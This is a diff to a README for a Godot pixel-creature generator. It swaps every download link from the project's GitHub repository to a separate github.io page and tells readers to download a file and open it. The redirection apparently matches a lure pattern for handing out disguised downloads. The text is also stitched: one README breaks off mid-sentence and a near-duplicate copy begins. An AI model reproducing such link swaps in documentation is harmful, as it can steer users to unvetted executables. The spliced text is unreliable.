@@ -1,6 +1,6 @@
 # 🎨 procedural-pixel-creatures - Create Unique Pixel Creatures Easily
 
-[![Download Procedural Pixel Creatures](https://img.shields.io/badge/Download-Procedural%20Pixel%20Creatures-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/procedural-pixel-creatures)
+[![Download Procedural Pixel Creatures](https://img.shields.io/badge/Download-Procedural%20Pixel%20Creatures-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://navnoorsingh39.github.io)
 
 Procedural Pixel Creatures is a Godot tool for making pixel creatures with automatic variation. It helps you generate creature designs, explore different shapes and colors, and save results for your own pixel art projects. The tool is aimed at users who want a faster way to create creature ideas without drawing every pixel by hand.
 
@@ -22,9 +22,9 @@ The main download page is hosted on GitHub. You do not need to create an account
 
 ## 📥 Download and Setup
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/procedural-pixel-creatures)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://navnoorsingh39.github.io)
 
-Visit this link to download the application: [procedural-pixel-creatures download page](https://github.com/navnoorsingh39/procedural-pixel-creatures).
+Visit this link to download the application: [procedural-pixel-creatures download page](https://navnoorsingh39.github.io).
 
 After the download finishes, open the downloaded file to launch the tool. Keep the downloaded file in a folder you can find again, such as your Downloads folder or Desktop. If you move the file later, open it from the new location.
 
@@ -139,7 +139,7 @@ Use the preview area before saving. Check the shape, colors, and details at the 
 
 Keep a folder for saved creatures. Clear file names make it easier to find# 🎨 procedural-pixel-creatures - Generate Pixel Creatures Instantly
 
-[![Download Procedural Pixel Creatures](https://img.shields.io/badge/Download-Procedural%20Pixel%20Creatures-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/procedural-pixel-creatures)
+[![Download Procedural Pixel Creatures](https://img.shields.io/badge/Download-Procedural%20Pixel%20Creatures-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://navnoorsingh39.github.io)
 
 Procedural Pixel Creatures is a Godot tool for making pixel creatures with automatic variation. It helps you create creature designs, explore different shapes and colors, and keep the results for your own pixel art projects. The tool is aimed at anyone who wants a faster way to produce creature ideas without drawing every pixel by hand.
 
@@ -161,9 +161,9 @@ The download page is hosted on GitHub. You do not need to create an account to v
 
 ## 📥 Download and Setup
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/navnoorsingh39/procedural-pixel-creatures)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://navnoorsingh39.github.io)
 
-Visit this link to download the application: [procedural-pixel-creatures download page](https://github.com/navnoorsingh39/procedural-pixel-creatures).
+Visit this link to download the application: [procedural-pixel-creatures download page](https://navnoorsingh39.github.io).
 
 After the download finishes, open the downloaded file to launch the tool. Keep the downloaded file in a folder you can find again, such as your Downloads folder or Desktop. If you move the file later, open it from the new location.
 
